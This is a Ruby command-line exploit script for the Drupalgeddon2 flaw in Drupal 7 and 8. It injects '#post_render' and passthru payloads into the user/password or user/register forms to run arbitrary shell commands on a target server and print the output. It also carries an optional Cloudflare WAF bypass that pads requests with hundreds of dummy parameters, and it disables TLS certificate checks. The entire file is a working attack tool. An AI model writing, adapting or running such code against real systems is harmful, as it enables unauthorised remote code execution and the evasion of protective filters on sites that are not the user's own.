#!/usr/bin/env ruby

# This version works both Drupal 8.X and Drupal 7.X

require 'base64'
require 'json'
require 'net/http'
require 'openssl'
require 'nokogiri'
require 'optparse'

options = {}
options[:cloudflare] = false

OptionParser.new do |opts|
  opts.banner = "Usage example: ./drupalgeddon-customizable-beta.rb -u http://example.com/ -v 7 -c id\nMore info: -h"
  options[:banner] = opts.banner

  opts.on("-u URL", "--url URL", "[Required] Service URL") do |d|
    options[:url] = d
  end

  opts.on("-v VERSION", "--version VERSION", "[Required] Target Drupal version {7,8}") do |d|
    options[:version] = d
  end

  opts.on("-c COMMAND", "--command COMMAND", "[Required] Command to execute") do |d|
    options[:command] = d
  end

  opts.on("-m PHP_METHOD", "--method PHP_METHOD", "[Optional] PHP Method to use, by default: passthru") do |d|
    options[:command] = d
  end

  opts.on("--form", "[Optional] Form to attack, by default '/user/password' in Drupal 7 and '/user/register' in Drupal 8") do |d|
    options[:form] = d
  end

  opts.on("--cloudflare", "[Optional] Tries to bypass Cloudflare using Lua-Nginx +100 parameters WAF Bypass") do |d|
    options[:cloudflare] = true
  end

  opts.on("-h", "--help", "Prints this help") do
    puts opts
    exit
  end

end.parse!

#
# Utils module for general and unrelated operations
#
module Utils

  # Green | Feedback when all good
  def success(text); "\e[#{32}m[+]\e[0m #{text}"; end
  # Red | Feedback when something goes wrong
  def error(text);   "\e[#{31}m[-]\e[0m #{text}"; end
  # Yellow | Feedback when something may have issues
  def warning(text); "\e[#{33}m[!]\e[0m #{text}"; end
  # Blue | Feedback when something doing something
  def action(text);  "\e[#{34}m[*]\e[0m #{text}"; end
  # Light blue | Feedback with helpful information
  def info(text);    "\e[#{94}m[i]\e[0m #{text}"; end
  # Dark grey | Feedback for the overkill
  def verbose(text); "\e[#{90}m[v]\e[0m #{text}"; end

end

# 
# All target related operations
# 
class Target
  include Utils

  # @param [String] host
  #   Host URL -> http://example.com
  # @param [String] php_method
  #   PHP method to use, by default passtrhu
  # @param [String] command
  #   Command to execute
  def initialize(host, command, php_method = 'passthru', form_path, cf_bypass)
    @host       = host
    @php_method = php_method
    @command    = command
    @uri        = URI.parse(host)
    @cf_bypass  = cf_bypass

    @form_path = form_path
    @http      = create_http
  end

  # Initiate HTTP connection
  # @return
  #   [Net::HTTP] object
  def create_http
    http = Net::HTTP.new(@uri.host, @uri.port)
    # Use SSL/TLS if needed
    if @uri.scheme == 'https'
      http.use_ssl = true
      http.verify_mode = OpenSSL::SSL::VERIFY_NONE
    end

    return http
  end

  # check a response code, 
  #   if 200, it means the target 
  # @param [Net::HTTPRespone] response
  #   the reponse object of request
  # @return [Boolean]
  #   also, it cheers up if true 
  def is_response_200?(response)
    if response.code == "200"
      puts success('Target seems to be exploitable! w00hooOO!')
      return true
    else
      puts error('Response: ' + response.code)
      return false
    end
  end

  # search_in_html 
  #   Parses any given value as an HTML and search in parsed HMLT document
  # @param [String] html
  #   A string contains html 
  # @param [String] search_str
  #   The CSS search string to earch in the html document 
  # @return [Nokogiri::HTML::Document]
  def search_in_html(html, search_str)
    html_doc = Nokogiri::HTML(html)
    html_doc.css(search_str)
  end

end

class Drupal8 < Target
  def initialize(host, command, php_method = 'passthru', form_path, cf_bypass)
    super(host, command, php_method, form_path, cf_bypass)
  end

  # Not finished yet
  def exploit

    # Make the request
    params = 'element_parents=account/mail/#value&ajax_form=1&_wrapper_format=drupal_ajax'
    if @cf_bypass
      params = 'a=&'*500 + params
    end

    post_path = "#{@uri.path}#{@form_path}/?#{params}"
    
    puts info("Requesting: #{post_path}")
    req       = Net::HTTP::Post.new(URI.encode(post_path))
    req.body  = "form_id=user_register_form&_drupal_ajax=1&mail[a][#post_render][]=" + 
                @php_method + "&mail[a][#type]=markup&mail[a][#markup]=" + @command

    if @cf_bypass
      req.body = 'a=&'*500 + req.body
    end

    puts info("POST: #{req.body}")
    res = @http.request(req)

    if is_response_200?(res) then 
      puts res.body.split('[{"command"')[0]
    end
  end
end

class Drupal7 < Target
  def initialize(host,command,php_method='passthru',form_path, cf_bypass)
    super(host, command, php_method, form_path, cf_bypass)
  end

  def get_form_build_id(response)
    form = search_in_html(response, 'form#user-pass')
    # returns either a new string (if a match is found) or nil
    form.to_s[/name="form_build_id" value="([^"]+)"/, 1]
  end

  def exploit

    payload = URI.encode("name[#post_render][]=#{@php_method}&name[#markup]=#{@command}&name[#type]=markup")

    if @cf_bypass
      payload = "a=&"*500 + payload
    end
    
    if @form_path.include? 'user/password'
      form  = '/user/password/?'
      form2 = 'file'
    elsif (@form_path.include? 'q=') && (@form_path.include? 'password') # Hacky as fuck
      form  = '/?q=user/password&'
      form2 = '?q=file'
    else
      form = @form_path
      form2 = 'file'
    end

    payload = @uri.path + form + payload

    puts info("Requesting: " + @uri.host + payload)
    puts info("POST: " + 'form_id=user_pass&_triggering_element_name=name')

    # First request, trying to obtain form_build_id
    req = Net::HTTP::Post.new(payload)
    req.body = 'form_id=user_pass&_triggering_element_name=name'

    res1 = @http.request(req)
    puts info(res1.code)

    form_build_id = get_form_build_id(res1.body)

    if form_build_id
      puts action("Obtained build id!: #{form_build_id}")
      post_parameters = "form_build_id=#{form_build_id}"

      # Second Request
      req = Net::HTTP::Post.new(URI.encode("#{@uri.path}#{form2}/ajax/name/#value/#{form_build_id}"))
      puts info("Requesting: " + @uri.host + URI.encode("#{@uri.path}#{form2}/ajax/name/#value/#{form_build_id}"))
      puts info("POST: " + post_parameters)
      req.body = post_parameters

      res2 = @http.request(req)

      puts info("Response code: " + res2.code)

      if res2.body.split('[{"command"')[0] == ""
        if(@command != 'id')
          error("Maybe incorrect input command, try simple command as 'id'")
        end
          error("")
      end

      puts res2.body.split('[{"command"')[0]
    else
      puts '[!] Could not find form build ID.'
    end
  end
end


# Read in values
target     = options[:url]
version    = options[:version]
command    = options[:command]
php_method = options[:method] || 'passthru'
form_path  = options[:version] == '7' ? 'user/password' : 'user/register'
cf_bypass  = options[:cloudflare]

case version
when "7"
  Drupal7.new(target, command, php_method, form_path, cf_bypass).exploit
when "8"
  Drupal8.new(target, command, php_method, form_path, cf_bypass).exploit
else
  Drupal8.new(target, command, php_method, form_path, cf_bypass).exploit
end
